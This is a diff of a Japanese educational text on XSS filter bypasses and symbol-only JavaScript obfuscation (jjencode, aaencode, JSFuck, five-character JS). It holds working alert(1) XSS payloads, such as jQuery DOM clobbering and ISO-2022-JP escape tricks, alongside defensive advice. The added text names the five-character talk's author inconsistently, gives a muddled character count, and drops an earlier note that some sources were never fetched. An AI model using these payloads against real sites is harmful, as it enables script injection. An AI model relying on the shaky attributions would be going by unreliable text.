-同様に **Vue.js**（`{{constructor.constructor('alert(1)')()}}`）、**jQuery**（`ownerDocument` という名前の入力でDOM Clobbering（DOM Clobbering: HTML要素のname/id属性でJSのプロパティ参照を上書き・誤誘導する手法）を起こし、追加系関数 `after/append/html` 等でスクリプトブロックを注入）、**underscore.js**（`<% %>` テンプレート）、**JSXTransformer / babel-standalone**（SVG内のスクリプトブロックのコメント `<!-- -->` を誤ってコードとして評価）を踏み台にする例が示されています。
+jjencodeの仕組みは、**まず記号だけで「作業用のグローバルオブジェクト」を1個組み立て、そのプロパティに『0〜9の数字』『よく使う文字』『必要な部品』を記号列として詰め込んでおき、以降はそのオブジェクトのプロパティを参照するだけで元コードの各文字を取り出す**、というものです。グローバル変数名には `$` や `_` のような記号1文字が使われます。数字や文字を作るのに、前述の `~`（ビット反転）・`!`・`+` といった演算子を駆使します。たとえば `~[]` は `-1`、`-~[]` は `1` になり、これらを積み上げて数値を作ります。
 
-```html
-jQueryの例（ownerDocumentクロバリング + コメントのみスクリプトの遮断漏れ）:
-<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
+最終的な実行段は、組み立てた文字列 `"..."`（元のコード）を、`Function` コンストラクタや `eval` に相当する呼び出しへ渡すことで行われます。記号だけで `"constructor"` という文字列を作り、`[]["constructor"]` のように辿ってコンストラクタ群（`Array` / `Function` など）へ到達できるため、`eval` という単語を一度も書かずにコード文字列を実行できるのです。
+
+はせがわ氏自身が挙げている jjencode の実務上の限界も重要です。**(1) IE7以前では動作しない（当時のブラウザ依存）、(2) 出力パターンが `$` などの記号で特徴的なため、かえって「難読化されている」と機械検知されやすい、(3) 変換規則が固定的なので容易にデコード（復号）できる**、という三点です。つまり jjencode は「シグネチャ回避」には一定の効果があっても、「本気の解析妨害」には向かない——これは難読化の本質的な性質（実行できる＝原理的に復元できる）を端的に示しています。
+
+> 出典: jjencode デモ — https://utf-8.jp/public/jjencode.html
+> 出典: はせがわようすけ「難読化JavaScript」 — https://www.docswell.com/s/hasegawa/K9VW8M-jsobfus
+
+#### aaencode: 顔文字でコードを書く
+
+**aaencode** は、jjencodeとまったく同じ原理を使いながら、出力を**日本語圏の顔文字（アスキーアート／emoticon）**で構成するという、視覚的インパクトの強い変種です。変数名や部品には `ﾟωﾟﾉ` `(ﾟΘﾟ)` `(ﾟｰﾟ)` のような顔文字風の識別子が使われます。
+
+```javascript
+ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; ...
 ```
-> なぜ動くか: `<input name=ownerDocument>` により `form.ownerDocument` の参照先を誤認させ、本来スクリプトを実行しない場面でjQueryが要素を挿入・実行してしまう。さらにjQueryはスクリプトブロック先頭の `<!--` を除去する処理を持ち、Auditorは「コメントしか含まないスクリプトブロック」を遮断しないため、両者が噛み合ってバイパスが成立する。
 
-**(2) ファイルアップロード／同一オリジンのユーザーコンテンツ**
+なぜこれが動くのか。JavaScriptの識別子（変数名）には、Unicodeの広い範囲の文字が使えます。半角カナや一部の記号は識別子文字として合法なので、`ﾟωﾟﾉ` は正当な変数名になります。数値は `(ﾟｰﾟ)=_=3` のように作られた部品から組み立てられ、文字は前述の型変換テクニックで取り出されます。最終的には jjencode と同様、組み立てた文字列を実行段へ渡します。パッと見「これがコードだとは思えない」ほど読めない一方、**JSやフィルタにとっては完全に正当なコード**である——という点に、難読化の教訓が凝縮されています。
 
-同一オリジンに攻撃者が `.js` ファイルをアップロードできれば、`<script src=/uploads/xss.js></script>` はクエリなし同一オリジンなので遮断されません。
+> 出典: はせがわようすけ「難読化JavaScript」/「JavaScript難読化読経」 — https://www.docswell.com/s/hasegawa/K9VW8M-jsobfus
 
-**(3) 文字コード（エンコーディング）の解釈差を突く**
+#### 防御側への含意: 難読化検知は「統計」で戦う
 
-Auditorは特定の文字コードの解釈をブラウザ本体と別に行うため、両者の食い違いを突けます。
+はせがわ氏は防御側の視点として、難読化コードの**検知手法**も示しています。着眼点は**文字種の統計分布**です。正当なライブラリ（jQuery や各サイトのスクリプト）はソース中の英数字比率が高く（例: 87〜88%）、対して jjencode / aaencode のような難読化コードは英数字比率が極端に低い（30〜55%程度）——この偏りをもって「怪しいコード」を機械判定できます。ブラックリストで特定文字列を消すのではなく、**分布という統計量で異常を見つける**というアプローチの違いは、防御設計上とても示唆的です。
 
-```html
-ISO-2022-JPのエスケープシーケンス挿入:
-<meta charset=iso-2022-jp><svg o[0x1B](Bnload=alert(1)>
-```
-> なぜ動くか: ISO-2022-JPでは `[0x1B](B`（ESC + `(B`）等のバイト列は「ASCIIへ戻す」制御シーケンスで、表示上は無視される。これを `onload` の途中に挟むと、Auditorは `o…nload` を連続した属性名と認識できず遮断に失敗するが、ブラウザは制御列を捨てて `onload` として解釈・実行する。
-
-IE/Edge側では、**HZ-GB-2312** のエスケープシーケンス、**UTF-7のBOM**（`+/v8` 等をページ先頭に置くとページ全体がUTF-7とみなされ、`+ADw-script+AD4-` が `<script>` になる）、そして **ナビゲーション時のエンコード不一致**（`x-chinese-cns` 等の文字コードで、フィルタが見る文字列と実際に送信されるバイト列を食い違わせる）といった、文字コード起因のバイパスが多数示されています。
-
-**(4) 正規表現の「置換で幅を超える」バイパス（IE/Edge）**
-
-IE/EdgeのXSSフィルターは `<sc{r}ipt.*?>` のような正規表現で遮断し、`.*?` に相当する部分（ワイルドカード）の許容幅が有限でした。置換によってその幅を超える文字列に膨らませると、遮断条件にマッチしなくなります。
-
-```html
-<script/&>alert(1)</script>   →（&が二重に置換され）→   <script/&amp;amp;>alert(1)</script>
-```
-> なぜ動くか: フィルタが許容するワイルドカード幅（この例では最大8文字）を、置換後の `/&amp;amp;`（10文字）が超えるため、`<script ...>` を検出できなくなる。パターンマッチ方式の「有限の遮蔽幅」という実装制約を突いた例。
-
-**(5) その他**: 複数のnullバイト（`[0x00]`×多数 + `<script>`）、`<script>` 内の `-->` によるコメント、半端な `<base>` タグでスクリプトの読み込み先を攻撃者ドメインへ差し替える、Flash（`allowscriptaccess=always` の `<embed>`／`flashvars`／`ExternalInterface.objectID`）、IEのAdobe Acrobat ReaderプラグインでPOST由来XSSを再送する、IE/EdgeでRefererを同一ドメインに偽装するとフィルタが働かない、など多数。
-
-#### 2.5 修正済みバイパスに見る「バージョン依存」の実例
-
-このチートシートは、修正済みの回避を別ページ（Fixed Bypass Archive）に保存しており、**攻撃可否がブラウザのバージョンに強く依存する**ことがよく分かります。例:
-
-- SVGの `<animate>` の `values` 属性による `javascript:` 実行 → **Chrome 59 / 62** で段階的に修正。
-- 半端な `</script` 閉じタグの利用 → **Chrome 61** で修正。
-- 複数nullバイト、`<script>` 内 `-->` コメント → **Chrome 62** で修正。
-- `<object><param name=url>` によるFlash実行 → **Chrome 64** で修正。
-- リンク＋半端な `<base href="javascript:\` → **Chrome 65** で修正。
-- Edgeのリファラ偽装バグ → **2018年4月**時点で修正確認。
-
-> これは教訓的です。「あるバージョンで塞がれた ≠ 恒久的に安全」。逆に「載っていない ≠ 攻撃不可能」でもありません。バージョンに紐づく攻撃は陳腐化するため、常に対象環境のバージョンを明記して評価する必要があります。
-
-#### 2.6 結論：XSSフィルターは「廃止」された — 根本対策こそが答え
-
-XSS Auditor / XSSフィルターは、(a) 保護しない文脈が広大で、(b) 回避が容易で、(c) しかも「正規スクリプトの選択的無効化」という**新たな攻撃面を生む**ものでした。この結論を受け、**GoogleはChrome 78（2019年）でXSS Auditorを完全に削除**し、`X-XSS-Protection` は非推奨となりました。MicrosoftもEdgeをChromiumベースへ移行する中でXSSフィルターを廃止しています。
-
-チートシート自身が明言するとおり、**バイパスできるかどうかにかかわらず、必ず根本的なXSS対策（文脈に応じた出力エンコード、危険なsinkの回避、そしてCSP）を行うべき**です。ブラウザ内蔵フィルタに頼る時代は終わりました。
-
-> 出典: Browser's XSS Filter Bypass Cheat Sheet（Masato Kinugawa） — https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
-> 出典: XSSフィルターの使い方 / Shibuya.XSS techtalk #9（Masato Kinugawa） — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-9
-> 出典: XSS Attacks Exploiting XSS Filter（Masato Kinugawa, CODE BLUE 2015） — https://www.slideshare.net/slideshow/xss-attacks-exploiting-xss-filter-by-masato-kinugawa-code-blue-2015/59712698
+> 出典: はせがわようすけ「難読化JavaScript」 — https://www.docswell.com/s/hasegawa/K9VW8M-jsobfus
 
 ---
 
-### 3. 5文字で書くJavaScript — 文字種を極限まで削る（資料2 / Kinugawa）
+### 第2部 JSFuck — 6文字で任意のJavaScriptを書く
 
-> ⚠️ **未取得の資料**: 「5文字で書くJavaScript / Shibuya.XSS techtalk #10（Masato Kinugawa）」は自動取得できませんでした（理由: speakerdeck.com がネットワークのエグレス制限で全面ブロックされているため）。以下のURLからユーザーご自身で直接ご覧ください: https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-10
->
-> （以下は、JSFuck公式リポジトリ `github.com/aemkei/jsfuck` のREADME・マッピング定義、および樹下氏のパイプライン演算子による5文字化に関する情報を統合した解説です。）
+第1部の型変換テクニックを極限まで削ぎ落とすと、**わずか6種類の記号**だけで任意のJavaScriptが書けます。これが Martin Kleppe が2012年に公開した **JSFuck** です（原型は2009〜2010年、はせがわ氏の jjencode や sla.ckers.org コミュニティの「非英数字JavaScript」競作にさかのぼります）。使える文字は次の6つだけです。
 
-#### 3.1 動機：なぜ「少ない文字種」で書けると強いのか
-
-XSSの現場では、「英字が使えない」「記号の一部しか通らない」「`(` `)` が禁止」といった**文字種の制限**にしばしば直面します（フィルタ、WAF、あるいは出力文脈の制約）。ならば逆に、「**任意のJavaScriptを、ごく少数の文字種だけで表現できる**」ことを示せれば、そうした制限の多くは無意味になります。この「表現の下限はどこか（＝最小の文字アルファベットは何文字か）」を追い求めるのが、短縮JavaScriptの世界です。
-
-#### 3.2 JSFuck — 6文字 `[]()!+` だけで任意のJSを書く
-
-**JSFuck**（Martin Kleppe / @aemkei、2012年）は、`[` `]` `(` `)` `!` `+` の**わずか6文字**だけで任意のJavaScriptを記述・実行する手法です。仕組みは「JavaScriptの型変換の緩さ」を段階的に積み上げるもので、次のように構築されます。
-
-**(1) 真偽値をつくる（`!` と `[]`）**
-
-```js
-![]    // false （空配列は真値なので、否定するとfalse）
-!![]   // true  （二重否定でtrue）
 ```
-> なぜ動くか: `!` は引数を真偽値へ強制変換する単項演算子。空配列 `[]` はJSでは「真」なので `![]` は `false`。
-
-**(2) 数値をつくる（`+`）**
-
-```js
-+[]              // 0    （空配列を数値化すると0）
-+!+[]            // 1    （+[]=0 → !0=true → +true=1）
-!+[]+!+[]        // 2    （true+true=2）
+[ ] ( ) ! +
 ```
-> なぜ動くか: 単項 `+` は値を数値へ変換する。`+[]` は `0`、`!0` は `true`、`true` を `+` で数値化すると `1`。これらを足し合わせて任意の整数を作れる。
 
-**(3) 文字列と文字を取り出す（`+[]` で文字列化 → 添字アクセス）**
+原理は第1部でみたとおりで、`![]`→`false`、`+[]`→`0`、`(![]+[])[+!+[]]`→`"a"` といった部品を積み上げます。JSFuckの核心は**最後の「コード実行」への到達方法**にあります。
 
-真偽値・数値を空配列と足すと**文字列**になり、そこから1文字ずつ取り出せます。
-
-```js
-![]+[]           // "false"
-!![]+[]          // "true"
-[][[]]+[]        // "undefined" （存在しないプロパティ参照はundefined）
-+[![]]+[]        // "NaN"
-(![]+[])[+[]]    // "false"[0] = "f"
-(![]+[])[!+[]+!+[]]  // "false"[2] = "l"
+```javascript
+// [] は配列。そのメソッド（例: filter）の constructor をたどると Function に届く
+[]["filter"]["constructor"]("alert()")()
 ```
-> なぜ動くか: `値 + []`（空配列との連結）はその値を文字列に変換する。`"false"`, `"true"`, `"undefined"`, `"NaN"` から `f,a,l,s,e,t,r,u,d,i,n,N` などの文字が得られる。添字は上で作った数値で指定する。
 
-**(4) さらに多くの文字を集める（指数表記・toString(36)）**
+なぜこれで任意コードが動くのか。`[]["filter"]` は `Array.prototype.filter`（関数）です。**あらゆる関数の `constructor` プロパティは `Function` コンストラクタ**を指します。`Function("本体となる文字列")` は「その文字列を関数本体とする新しい関数」を生成するので、実質的に `eval` と同じ「文字列→コード」変換器です。生成した関数を末尾の `()` で即時呼び出せば、任意のコードが実行されます。`"filter"` も `"constructor"` も `"alert()"` もすべて第1部の要領で記号だけの文字列に組み立てられるため、**全体が `[]()!+` の6文字だけ**で完結します。
 
-`"undefined"` から得た `"e"` を使って指数表記の数（`"1e309"→Infinity`）を作ると `I,f,n,t,y,.,+,-` が、数値の `toString(36)`（36進数化）を使うと `a`〜`z` の全小文字が手に入ります。
+ここで一つ問題があります。`"constructor"` に必要な `c` `o` は、`"false"/"true"/"undefined"/"NaN"` のどれにも含まれていません。JSFuckはこれを、**ネイティブ関数の文字列表現**と**基数変換**で解決します。
 
-```js
-(11)["toString"](36)   // "b"
-(35)["toString"](36)   // "z"
+```javascript
+[]["fill"]+[]        // → "function fill() { [native code] }"
+                     //   ここから c o t i n f u ( ) { } スペース [ ] などが拾える
+(+(10))["toString"](36) // → "a"、(+(12))["toString"](36) → "c" …基数36で a〜z が得られる
 ```
-> なぜ動くか: `Number.prototype.toString(基数)` は2〜36進数の文字列を返す。基数36なら数字と全アルファベット小文字を表現でき、`10→"a"`, `35→"z"` のように任意の小文字を数値経由で生成できる。
 
-**(5) 最後の鍵：`Function` コンストラクタ（`()`）**
+`[]["fill"]+[]`（配列メソッドを文字列化）は `"function fill() { [native code] }"` という文字列になり、ここに含まれる `c` `o` `n` `f` `u` `t` `i` や空白・括弧を回収できます。さらに数値の `toString(36)`（36進数表現）を使えば、`a`〜`z` の任意の英小文字を「数字→文字」変換で取り出せます。こうしてアルファベット全体が記号だけでカバーされ、**JSFuckは任意のJavaScriptを表現可能（チューリング完全）**になります。
 
-集めた文字で `"constructor"` という文字列を組み立て、`[]["constructor"]` などから **`Function` コンストラクタ**へ到達します。`Function` は文字列を関数本体として受け取り、任意コードを実行する「マスターキー」です。
+> 出典: JSFuck — Write any JavaScript with 6 Characters（GitHub / aemkei） — https://github.com/aemkei/jsfuck
+> 出典: JSFuck — Esolang Wiki — https://esolangs.org/wiki/JSFuck
 
-```js
-[]["fill"]["constructor"]("alert(1)")()          // = Function("alert(1)")() = alert(1)を実行
-[]["fill"]["constructor"]("return this")()       // = window（グローバルオブジェクト）を取得
-```
-> なぜ動くか: あらゆる関数の `constructor` は `Function` コンストラクタ。`Function("コード")` は `eval` と同等の「文字列をコードとして実行する」能力を持ち、しかも `window` への参照が不要。`"return this"` を本体にすれば戻り値としてグローバルスコープ（`window`）が手に入り、以降あらゆるグローバル変数へアクセスできる。この2段構え（`constructor.constructor` 相当 → `Function` → 実行）が短縮・難読化の共通の心臓部。
+#### 防御の観点: 「文字を消す」フィルタは JSFuck に無力
 
-こうして、`alert(1)`（本来22文字弱）は6文字だけで書けますが、代償として**数千文字**に膨れ上がります（JSFuck公式のサンプルでは `alert(1)` が約数KB）。実行結果は完全に同一です。フィルタ回避の観点では、「`alert` も `script` も英数字も一切含まないのに任意コードが動く」ことが決定的です。
-
-#### 3.3 「6文字の壁（Wall of Six）」を破る — 5文字への挑戦
-
-長らくJSFuckの6文字が最小と考えられ、「6文字の壁（The Wall of Six）」と呼ばれてきました。これを**5文字**へ削る研究が2016〜2017年に相次ぎ、その一角を担ったのが樹下雅章氏の発表「5文字で書くJavaScript」です。代表的な5文字アルファベットは次の3系統です（Sylvain Pollet-Villard の Xchars.js が整理）。
-
-- **`$+=[]`（Martin Kleppe「$five」系）**: `$` を変数名として使い、`=` で代入、`+` と `[]` で値を組み立てる。`(` `)` `!` を捨てる代わりに `$` と `=` を導入する（6−3+2=5）。関数呼び出しに括弧を使えない問題は、**特定バージョンのライブラリ（jQuery UI 1.12.4 の DatePicker の公開プロパティ）を踏み台**にしてコード注入・実行を成立させる、という「ガジェット依存」で解決している。
-- **`[+=_]` / `[$+=]`（Xchars.js のその他の系統）**: いずれも特定IDのスクリプトや特定版jQuery UIなど、外部の「足場」を前提に成立する。
-- **`[]+|>`（樹下雅章「パイプライン演算子」系）**: これが樹下氏の寄与。
-
-**樹下氏のパイプライン演算子アプローチの原理**（`[` `]` `+` `|` `>` の5文字）:
-
-1. JSFuckの `!`（真偽値づくり）を **`>` で置き換える**。比較演算子 `>` は真偽値を返すので、`[]>[]`（false）等で `![]` の代替になる（JSFuck公式READMEも「`!` は `<` や `=`、`>` で代替しうる」と明記）。しかも `>` は「片方をシフト演算 `>>` に使って数を作る」など多用途。
-2. JSFuckの `(` `)`（関数呼び出し）を **パイプライン演算子 `|>` で置き換える**。`x |> f` は概ね `f(x)` に相当し、括弧なしで関数適用ができる。`|>` は `|` と `>` の2文字だが、`>` は既に(1)で使うため、**新規に増えるのは `|` の1文字だけ**。
-3. 差し引き: `[]()!+`（6）から `!` `(` `)` を落とし（−3）、`|` を足す（+1）と、残るのは `[` `]` `+` `|` `>` の **5文字**。
-
-> なぜ「5文字」に収まるか: `>` が「真偽値の生成」と「パイプライン `|>` の一部」を**兼任**する点が鍵。1文字に2役をさせることで、追加コストを `|` の1文字だけに抑え、6文字の壁を割った。
-
-**重大な但し書き（バージョン・仕様依存）**: パイプライン演算子 `|>` は **TC39（JavaScriptの標準化委員会）の提案段階の機能**であり、2026年時点でも言語標準には入っていません。ネイティブのブラウザでは動かず、**Babel（トランスパイラ）のプラグインでのみ**評価できます。したがって樹下氏の5文字アプローチは「理論上・特定処理系上での到達点」であり、素のブラウザに対する実戦XSSでそのまま5文字を使えるわけではありません。実戦で頼れる汎用手法は依然としてJSFuckの6文字（および後述の記号系難読化）です。この「理論的下限」と「実戦での可用性」の区別は重要です。
-
-#### 3.4 括弧なしで関数を呼ぶ他の方法（応用の引き出し）
-
-JSFuck公式READMEは、`()` を使わずに関数を実行する代替手段も列挙しており、XSSでの応用が効きます。
-
-- **テンプレートリテラル（バッククォート）**: `` f`...` `` はタグ付きテンプレートとして `f` を呼び出す。例: `alert`1`` は `alert("1")` 相当（引数は文字列に限られる）。
-- **イベントハンドラへの代入**: `onerror=f;throw 1` や `onload=f`、`onhashchange=f;location.hash=1` などで、括弧なしに関数を発火させる（`=` が必要）。
-- **`new` 演算子**: `new f` でコンストラクタとして呼ぶ。
-- **暗黙の型変換（`toString`/`valueOf`）**: メソッドを `toString` に割り当て、文字列化のタイミングで暗黙実行する。
-- **`Symbol.toPrimitive` / `Symbol.iterator`**: シンボルで暗黙呼び出しを誘発する。
-
-> XSS実務での含意: 「`(` `)` が禁止」という制約に対しても、バッククォートやイベントハンドラで関数を発火できる。文字種制限は「表現の言い換え」でしばしば回避可能——これが短縮JavaScriptの実戦的な教訓です。
-
-> 出典: JSFuck — Write any JavaScript with 6 Characters `[]()!+`（Martin Kleppe / aemkei, README・jsfuck.js） — https://github.com/aemkei/jsfuck
-> 出典: 5文字で書くJavaScript / Shibuya.XSS techtalk #10（Masato Kinugawa） — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-10
-> 出典: Xchars.js（Sylvain Pollet-Villard, 5文字系統の整理） — https://slides.com/sylvainpv/xchars-js/ ／ $five（Martin Kleppe） — https://aem1k.com/five/
+JSFuckの存在は、防御設計に強烈な示唆を与えます。`<script>` も `eval` も `alert` も、そして英数字すらもソースに一切現れないのに、コードは完全に動きます。したがって**「危険なキーワードを除去する」タイプのブラックリスト・サニタイズは、そもそも成立しない**——これがJSFuckの最大の教訓です。正しい防御はブラックリストではなく、**出力コンテキストに応じた正しいエスケープ**と、**そもそもユーザー入力を実行コンテキスト（`innerHTML`・`eval`・イベントハンドラ属性・`javascript:` スキーム）へ流さない設計**、そして CSP（Content Security Policy）による**インライン/`eval` 実行そのものの禁止**です。JSFuckで組んだコードも、`unsafe-inline` と `unsafe-eval` を禁じた CSP 下では実行できません。
 
 ---
 
-### 4. 難読化JavaScript — 記号だけで書くjjencode / aaencode（資料3 / はせがわ）
+### 第3部 5文字JavaScript（Kinugawa / Shibuya.XSS #10）
 
-> ⚠️ **未取得の資料**: 「難読化JavaScript（はせがわようすけ）」は自動取得できませんでした（理由: docswell.com がネットワークのエグレス制限で全面ブロックされているため）。以下のURLからユーザーご自身で直接ご覧ください: https://www.docswell.com/s/hasegawa/K9VW8M-jsobfus
->
-> （以下は、はせがわようすけ氏が作成したjjencode／aaencodeの原理を、JSFuckと同じ土台の上で対比しながら復元した解説です。氏の関連資料「JavaScript難読化読経」等も参照しています。）
+#### 「6文字の壁（Wall of Six）」を破る
 
-#### 4.1 難読化とは何か、なぜ攻撃・防御双方で重要か
+JSFuckの `[]()!+` は長らく「これ以上は減らせない最小集合」と信じられ、**「6文字の壁（Wall of Six）」**と呼ばれていました。この壁を破ったのが、2017年前後の一連の研究です。衣笠正人氏は 2017年12月13日の **Shibuya.XSS techtalk #10「5文字で書くJavaScript」**で、**JSFuckを5種類の記号にまで削減できる**ことを示しました。
 
-**難読化（obfuscation）**とは、コードの動作は変えずに、人間（および単純なパターンマッチ）にとって読み取りにくい形へ変形する処理です。攻撃側の動機は主に2つ。
+衣笠氏のアプローチの鍵は、**パイプライン演算子（pipeline operator `|>`）**の利用です。パイプライン演算子は当時 TC39（JavaScriptの標準化委員会）で提案中だった構文で、`x |> f` が「`f(x)` を呼ぶ」ことに相当します。JSFuckで最後に必要だった「関数呼び出しの丸括弧 `(` `)`」を、この `|>` で置き換えることで、`( )` を捨てられます。結果として使う記号は次の5種類になります。
 
-1. **シグネチャ検知（既知の悪性パターンとの一致で検出する方式）の回避**: WAF・アンチウイルス・EDRなどが「`document.cookie` を外部へ送る」「`eval(` を使う」といった特徴文字列で検出するのを、別表記に化けさせてすり抜ける。
-2. **解析の遅延**: マルウェア解析者やサンドボックスによる自動解析を妨害する。
-
-防御側（本教科書の主眼）にとって重要なのは、**「難読化されていても、最終的にはブラウザ／エンジンが元のコードとして実行する」**という事実です。つまり難読化は入口対策（パターン検知）を無力化しうる一方、根本対策（出力エンコード・CSP・危険sinkの排除）は難読化の有無に一切影響されません。はせがわ氏の一貫した結論も「**難読化はセキュリティではない（obfuscation is not security）**」——攻撃を隠せても防げず、防御は難読化に依存してはならない、というものです。
-
-#### 4.2 記号だけで書く共通原理：`constructor.constructor` → `Function` → 実行
-
-jjencode・aaencode・JSFuckは、見た目こそ大きく違いますが、**心臓部は完全に同一**です。すなわち:
-
-```js
-(0).constructor            // Number
-(0).constructor.constructor // Function（Numberの生成元＝Function）
-[].constructor.constructor  // 同上（Arrayから）
-({}).constructor.constructor // 同上（Objectから）
 ```
-> なぜ動くか: プリミティブ値やオブジェクトの `.constructor` はそれを生んだ組み込み関数（`Number`, `Array`, `Object` など）を指し、**関数の `.constructor` は必ず `Function`**。よって `任意の値.constructor.constructor` は `Function` コンストラクタに到達し、`Function("コード")()` で任意JSを実行できる。JSFuckが英字を型変換で組み立てて到達したのと同じゴールへ、jjencode/aaencodeは「記号だけで数字・文字列を組み立てて」到達する。
-
-#### 4.3 jjencode — 18種類の記号だけでJavaScriptを書く（2009年 / はせがわ）
-
-**jjencode**（はせがわようすけ、2009年7月公開）は、任意のJavaScriptを **`[ ] ( ) ! + , " $ . : ; _ { } ~ =` の18種類の記号だけ**で表現するエンコーダです。生成物の構造は次のとおり（既定のグローバル変数名は `$`）。
-
-```js
-$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,
-$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,
-$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};
-$.$_=($.$_=$+"")[$.$$_]+ ... ;   // 以降、文字列部品を組み立て
-$.$($.$( ... )());               // 最後にFunctionコンストラクタで本体を実行
+[ ] + | >
 ```
 
-構造の読み解き:
+`( )` の2文字を捨てる代わりに `|` `>` の1文字ぶん（`|>` は2記号だが「種類」としては2つ）を加える、という発想です。値の組み立て（`![]`→false、`+[]`→0、文字のインデックス取得…）は JSFuck と共通で、**唯一「呼び出し」だけをパイプライン演算子に置き換える**ことで、文字種を6→5に削減しました。
 
-- **`$=~[]` で `-1` を得る**: `~[]` はビット否定。`[]` は数値化すると `0`、`~0` は `-1`。これを起点に `++$` で `0, 1, 2, …` と数値を量産する。
-> なぜ動くか: `~`（ビット反転）は `~0 == -1`。ここから前置インクリメント `++$` を繰り返して整数を作り、後述の文字取り出しの添字に使う。
-- **記号から文字を掘り出す**: `(![]+"")` は `"false"`、`(!""+"")` は `"true"`、`({}+"")` は `"[object Object]"`。これらを添字で切り出し、`f,a,l,s,e,t,r,u,o,b,j,c,...` を集める。
-> なぜ動くか: JSFuckと同じ「真偽値・オブジェクトを文字列化して1文字ずつ取る」原理。使える文字種を記号だけに保ったまま、`"constructor"` などのメソッド名を組み立てられる。
-- **最後に `Function` を呼ぶ**: 組み立てた `"constructor"` から `$.$`（＝ `Function` 相当）を作り、本体文字列を渡して実行する。
+> 出典: 衣笠正人「5文字で書くJavaScript」Shibuya.XSS techtalk #10 — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-10
 
-はせがわ氏自身が指摘するとおり、jjencodeは**復号が容易**で、真の防御にはなりません（実際、専用デコーダが多数存在）。しかしその教育的価値は絶大で、「記号だけで任意コードが書ける」という事実が、後のJSFuck（2012年）へ直接つながりました。JSFuckのREADMEやWikipediaも「jjencode / aaencode と同じ基本原理」と明記しています。
+#### その後の展開と別解
 
-#### 4.4 aaencode — JavaScriptを顔文字（AA）に変える（はせがわ）
+この成果は、Sylvain Pollet-Villard による **Xchars.js** プロジェクトへと発展しました。Xchars.js は「5文字で書く」二つの解を提示しています。ひとつは衣笠氏由来の **`[ ] + | >`**（パイプライン演算子を使う版）。もうひとつは **`[ ] + = _` 系**の別解で、こちらは特定のIDを持つスクリプトなど実行環境側の前提を利用します。
 
-**aaencode**（はせがわようすけ）は、jjencodeと**まったく同じ原理**を使いつつ、生成物を**日本語の顔文字（kaomoji / アスキーアート）**の羅列に化けさせるエンコーダです。出力は常に次のようなヘッダで始まります。
+さらに Martin Kleppe と Sylvain Pollet-Villard による **`$five`（aem1k.com/five）**は、また別の5文字集合 **`$ + = [ ]`** を提示しています。この版は演算子だけに頼るのではなく、**jQuery UI（Sizzle セレクタエンジン `$.find` のソースコードには膨大な文字が含まれる）を「文字の在庫」として流用**し、DatePickerプラグインの `dpDiv` プロパティ経由で `document.body.innerHTML += '<img src onerror="alert(1)">'` に相当するペイロードをDOMへ注入します。
 
-```js
-ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ);
-（ﾟДﾟ） =（ﾟΘﾟ）= (o^_^o)/ (o^_^o); ... （ﾟДﾟ）['_']( （ﾟДﾟ）['_'] ) (b) ;
+```javascript
+// $five の基本部品（$ + = [ ] の5文字のみ）
+0 === +[]              // 0 を作る
+1 === ++[[]][+[]]      // インクリメントで 1 を作る
+[][+[]] + []          // → "undefined"（ここから文字を拾う）
+// $ = jQuery。$.find（Sizzleのソース）を巨大な文字プールとして使う
 ```
-> なぜ動くか: `(ﾟΘﾟ)`, `(ﾟｰﾟ)`, `(o^_^o)`, `（ﾟДﾟ）` などは**単なる変数名・値の入れ物**にすぎない。jjencode同様に `0/1/数値`、文字列部品を組み立て、最後に `（ﾟДﾟ）['_'](...)` の形で `Function` を呼び出して本体を実行する。顔文字はあくまで「見た目の衣装」で、JavaScriptエンジンにとっては普通の識別子と演算子の連なりである。
 
-aaencodeの狙いは、**人間には完全にノイズにしか見えないのに、エンジンには正しく動く**という極端な可読性破壊です。マルウェアが解析妨害やシグネチャ回避に用いた例があり、逆に防御側は「顔文字だらけのJS＝要警戒」というヒューリスティックで検知することもあります。
+なぜ「5文字」が重要なのか。攻撃の実用性の観点では、**フィルタが特定記号（たとえば括弧やクオート）を潰してくる状況でも、残った少数の記号だけでコード実行に到達できる**ことを意味します。防御の観点では、JSFuck同様「使える文字を減らせば安全」という直感が誤りであることの、さらに強い証明になっています。同時に、パイプライン演算子のような**将来の言語仕様の追加が、そのまま新しい攻撃資源になりうる**という、言語設計と攻撃面の関係を示す好例でもあります。
 
-#### 4.5 難読化の一般的な道具箱（はせがわ資料の全体像）
-
-記号系エンコーダは難読化の一形態にすぎません。はせがわ氏の資料群（「難読化JavaScript」「JavaScript難読化読経」等）は、実戦で使われる難読化手法を体系立てています。防御側が「見た目に騙されない」ために、代表的な引き出しを押さえておきます。
-
-- **文字列の分割・連結**: `"aler"+"t"`、`["al","ert"].join("")` のようにキーワードを断片化して検知を逃れる。
-- **文字コードによる表現**: `String.fromCharCode(97,108,101,114,116)` → `"alert"`。あるいは `\x61\x6c…`（16進エスケープ）、`a…`（Unicodeエスケープ）、`\141`（8進エスケープ）で1文字ずつ表す。
-> なぜ動くか: JS文字列リテラルは複数のエスケープ表記を許し、いずれもパース時に同じ文字へ復元される。フィルタが生の `alert` を探しても、エスケープ表記は一致しない。
-- **動的評価への集約**: 断片を組み立てた文字列を `eval(...)` / `Function(...)()` / `setTimeout("...")` / `location='javascript:...'` へ渡して実行する。難読化の「出口」はほぼ必ずこの動的評価に収束する。
-- **プロパティアクセスの分解**: `window["ale"+"rt"]`、`top[/al/.source+/ert/.source]` のようにブラケット記法で危険な名前を組み立てる。
-- **エンコード方式の入れ子**: URLエンコード → HTML実体参照 → JSエスケープと多層に包み、フィルタのデコード段数とブラウザのデコード段数の差を突く（前セクションのInvictiの論点と同根）。
